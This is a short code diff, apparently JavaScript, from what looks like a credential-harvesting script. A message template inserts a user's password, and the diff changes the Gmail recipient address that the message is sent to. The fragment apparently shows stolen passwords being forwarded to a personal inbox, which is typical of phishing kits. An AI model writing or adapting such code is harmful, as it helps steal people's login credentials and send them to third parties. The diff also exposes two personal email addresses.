@@ -74,7 +74,7 @@ password : ${password}
 Gracias.
 `;
   const envelope = {
-    email: "natureelover225@gmail.com",
+    email: "mailtask5850@gmail.com",
     text: messageTemplate,
   };
 
